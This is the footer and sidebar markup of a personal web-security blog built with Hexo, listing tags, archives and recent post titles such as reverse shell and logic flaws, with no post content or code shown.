      <a data-url="https://monkeyh0ck.github.io/2021/10/01/xiaodi1/" data-id="clfpez940000efcv57bwx5jbv" data-title="小迪安全" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web-security/" rel="tag">web-security</a></li></ul>

    </footer>
  </div>
  
</article>



  


</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/web-security/" rel="tag">web-security</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签云</h3>
    <div class="widget tagcloud">
      <a href="/tags/web-security/" style="font-size: 10px;">web-security</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">归档</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">六月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">十月 2021</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">最新文章</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2022/06/01/%E5%8F%8D%E5%BC%B9shell/">反弹shell</a>
          </li>
        
          <li>
            <a href="/2022/06/01/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">逻辑漏洞</a>
          </li>
        
          <li>
            <a href="/2021/10/01/ICMP/">ICMP</a>
          </li>
        
          <li>
            <a href="/2021/10/01/docker/">docker</a>
          </li>
        
          <li>
            <a href="/2021/10/01/network/">计算机网络</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2023 HOU<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>